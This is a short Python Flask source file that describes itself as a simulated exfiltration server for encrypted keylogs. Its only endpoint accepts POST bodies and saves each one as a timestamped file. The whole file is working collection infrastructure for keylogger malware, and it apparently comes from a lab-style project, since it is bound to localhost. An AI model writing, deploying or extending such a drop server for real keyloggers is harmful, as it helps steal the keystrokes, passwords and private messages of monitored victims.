# server.py
# 🚀 Simulated exfiltration server for receiving encrypted keylogs via POST

from flask import Flask, request
from datetime import datetime
import os

app = Flask(__name__)

# Directory to store received logs
LOG_DIR = "received_logs"
os.makedirs(LOG_DIR, exist_ok=True)

@app.route('/receive-log', methods=['POST'])
def receive_log():
    encrypted_data = request.data

    if not encrypted_data:
        return "❌ No data received", 400

    # Save with timestamped filename
    timestamp = datetime.now().strftime('%Y%m%d-%H%M%S')
    filename = os.path.join(LOG_DIR, f"log-{timestamp}.bin")

    with open(filename, "wb") as f:
        f.write(encrypted_data)

    print(f"✅ Received and saved encrypted log: {filename}")
    return "✅ Log received", 200

if __name__ == '__main__':
    app.run(host="127.0.0.1", port=5000)
